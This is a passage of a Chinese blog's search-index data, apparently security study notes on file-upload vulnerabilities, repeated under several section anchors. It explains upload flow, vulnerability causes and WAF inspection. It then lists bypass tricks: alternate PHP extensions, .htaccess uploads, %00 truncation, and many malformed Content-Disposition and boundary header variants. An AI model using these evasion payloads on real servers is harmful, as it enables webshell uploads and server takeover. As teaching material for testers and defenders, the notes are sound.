multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#黑名单绕过"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#白名单绕过"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#字符变异"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#引号变换"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#大小写变换"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#添加换行符"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 